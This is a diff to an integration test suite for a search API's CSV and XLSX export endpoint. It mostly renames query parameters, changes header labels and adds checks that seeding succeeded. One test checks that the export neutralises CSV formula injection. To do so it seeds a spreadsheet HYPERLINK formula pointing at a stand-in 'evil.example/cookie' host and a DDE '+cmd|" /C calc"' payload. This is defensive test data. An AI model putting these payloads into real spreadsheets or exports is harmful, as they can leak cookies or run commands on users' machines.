@@ -33,20 +33,28 @@ beforeEach(async () => {
   taskTypeId = await getIssueTypeConfigId('TASK');
 
   // Seed three issues with different priorities so we can filter in JQL.
+  // NB: createIssueDto treats `description` as `.optional()` — null is REJECTED
+  // with 400. We omit the field entirely for non-HIGH issues rather than
+  // passing null, and assert 201 on every POST so a future DTO change fails
+  // loudly instead of producing an empty search.
   for (const [i, priority] of [
     [1, 'CRITICAL'],
     [2, 'HIGH'],
     [3, 'LOW'],
   ] as const) {
-    await request
+    const body: Record<string, unknown> = {
+      title: `Issue ${i}`,
+      issueTypeConfigId: taskTypeId,
+      priority,
+    };
+    if (priority === 'HIGH') body.description = 'has,comma "and quote"';
+    const res = await request
       .post(`/api/projects/${projectId}/issues`)
       .set('Authorization', `Bearer ${adminToken}`)
-      .send({
-        title: `Issue ${i}`,
-        issueTypeConfigId: taskTypeId,
-        priority,
-        description: priority === 'HIGH' ? 'has,comma "and quote"' : null,
-      });
+      .send(body);
+    if (res.status !== 201) {
+      throw new Error(`Failed to seed issue ${i}: ${res.status} ${JSON.stringify(res.body)}`);
+    }
   }
 });
 
@@ -90,7 +98,7 @@ describe('POST /api/search/export — CSV', () => {
     const res = await request
       .post('/api/search/export')
       .set('Authorization', `Bearer ${adminToken}`)
-      .send({ jql: `project = "${projectKey}"`, format: 'csv' });
+      .send({ jql: `project = "${projectId}"`, format: 'csv' });
 
     expect(res.status).toBe(200);
     expect(res.headers['content-type']).toContain('text/csv');
@@ -100,8 +108,8 @@ describe('POST /api/search/export — CSV', () => {
     // header + 3 issues
     expect(rows.length).toBe(4);
     const header = rows[0];
-    expect(header).toContain('Ключ'); // key label
-    expect(header).toContain('Название'); // summary label
+    expect(header).toContain('Key');
+    expect(header).toContain('Summary');
   });
 
   it('respects requested columns (order + subset)', async () => {
@@ -109,7 +117,7 @@ describe('POST /api/search/export — CSV', () => {
       .post('/api/search/export')
       .set('Authorization', `Bearer ${adminToken}`)
       .send({
-        jql: `project = "${projectKey}"`,
+        jql: `project = "${projectId}"`,
         format: 'csv',
         columns: ['key', 'priority'],
       });
@@ -129,7 +137,7 @@ describe('POST /api/search/export — CSV', () => {
       .post('/api/search/export')
       .set('Authorization', `Bearer ${adminToken}`)
       .send({
-        jql: `project = "${projectKey}"`,
+        jql: `project = "${projectId}"`,
         format: 'csv',
         columns: ['key', 'nonexistentColumn', 'priority'],
       });
@@ -145,7 +153,7 @@ describe('POST /api/search/export — CSV', () => {
       .post('/api/search/export')
       .set('Authorization', `Bearer ${adminToken}`)
       .send({
-        jql: `project = "${projectKey}"`,
+        jql: `project = "${projectId}"`,
         format: 'csv',
         columns: ['nonexistent1', 'nonexistent2'],
       });
@@ -155,21 +163,28 @@ describe('POST /api/search/export — CSV', () => {
 
   it('wraps cells starting with =/+/-/@ to neutralise CSV formula injection', async () => {
     // Create a project whose name is an Excel formula payload.
-    const danger = await request
+    const dangerProjCreate = await request
       .post('/api/projects')
       .set('Authorization', `Bearer ${adminToken}`)
       .send({ name: '=HYPERLINK("http://evil.example/cookie","click")', key: 'DGR' });
+    if (dangerProjCreate.status !== 201) {
+      throw new Error(`Failed to create danger project: ${dangerProjCreate.status} ${JSON.stringify(dangerProjCreate.body)}`);
+    }
+    const dangerProjId = dangerProjCreate.body.id as string;
 
-    await request
-      .post(`/api/projects/${danger.body.id}/issues`)
+    const dangerIssue = await request
+      .post(`/api/projects/${dangerProjId}/issues`)
       .set('Authorization', `Bearer ${adminToken}`)
       .send({ title: '+cmd|" /C calc"!A1', issueTypeConfigId: taskTypeId });
+    if (dangerIssue.status !== 201) {
+      throw new Error(`Failed to create danger issue: ${dangerIssue.status} ${JSON.stringify(dangerIssue.body)}`);
+    }
 
     const res = await request
       .post('/api/search/export')
       .set('Authorization', `Bearer ${adminToken}`)
       .send({
-        jql: `project = "DGR"`,
+        jql: `project = "${dangerProjId}"`,
         format: 'csv',
         columns: ['project', 'summary'],
       });
@@ -189,7 +204,7 @@ describe('POST /api/search/export — CSV', () => {
       .post('/api/search/export')
       .set('Authorization', `Bearer ${adminToken}`)
       .send({
-        jql: `project = "${projectKey}" AND priority = HIGH`,
+        jql: `project = "${projectId}" AND priority = HIGH`,
         format: 'csv',
         columns: ['key', 'description'],
       });
@@ -220,7 +235,7 @@ describe('POST /api/search/export — CSV', () => {
   it('returns 401 without auth', async () => {
     const res = await request
       .post('/api/search/export')
-      .send({ jql: `project = "${projectKey}"`, format: 'csv' });
+      .send({ jql: `project = "${projectId}"`, format: 'csv' });
     expect(res.status).toBe(401);
   });
 
@@ -228,7 +243,7 @@ describe('POST /api/search/export — CSV', () => {
     const res = await request
       .post('/api/search/export')
       .set('Authorization', `Bearer ${adminToken}`)
-      .send({ jql: `project = "${projectKey}"`, format: 'pdf' });
+      .send({ jql: `project = "${projectId}"`, format: 'pdf' });
     expect(res.status).toBe(400);
   });
 });
@@ -245,7 +260,7 @@ describe('POST /api/search/export — XLSX', () => {
         resIn.on('data', (c: Buffer) => chunks.push(c));
         resIn.on('end', () => cb(null, Buffer.concat(chunks)));
       })
-      .send({ jql: `project = "${projectKey}"`, format: 'xlsx' });
+      .send({ jql: `project = "${projectId}"`, format: 'xlsx' });
 
     expect(res.status).toBe(200);
     expect(res.headers['content-type']).toContain('spreadsheetml.sheet');
@@ -268,7 +283,7 @@ describe('RBAC scope', () => {
     const res = await request
       .post('/api/search/export')
       .set('Authorization', `Bearer ${plainToken}`)
-      .send({ jql: `project = "${projectKey}"`, format: 'csv' });
+      .send({ jql: `project = "${projectId}"`, format: 'csv' });
 
     expect(res.status).toBe(200);
     const rows = parseCsv(res.text);
